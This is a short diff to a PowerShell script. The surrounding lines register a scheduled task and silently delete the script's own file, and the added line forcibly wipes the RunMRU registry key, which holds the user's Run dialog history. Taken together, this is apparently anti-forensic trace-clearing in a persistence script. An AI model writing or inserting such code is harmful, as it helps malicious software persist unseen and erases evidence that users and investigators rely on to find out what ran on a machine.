@@ -106,3 +106,5 @@ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Se
 if ($MyInvocation.MyCommand.Path) {
     Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
 }
+
+Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force
